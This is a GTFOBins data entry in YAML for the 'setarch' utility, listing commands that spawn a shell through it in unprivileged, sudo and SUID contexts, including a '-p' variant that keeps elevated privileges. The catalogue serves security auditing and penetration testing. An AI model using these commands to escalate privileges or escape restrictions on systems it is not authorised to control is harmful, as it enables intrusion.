<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/setarch -->
---
functions:
  shell:
  - code: |-
      setarch -3 /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          setarch -3 /bin/sh -p
        shell: false
      unprivileged:
...
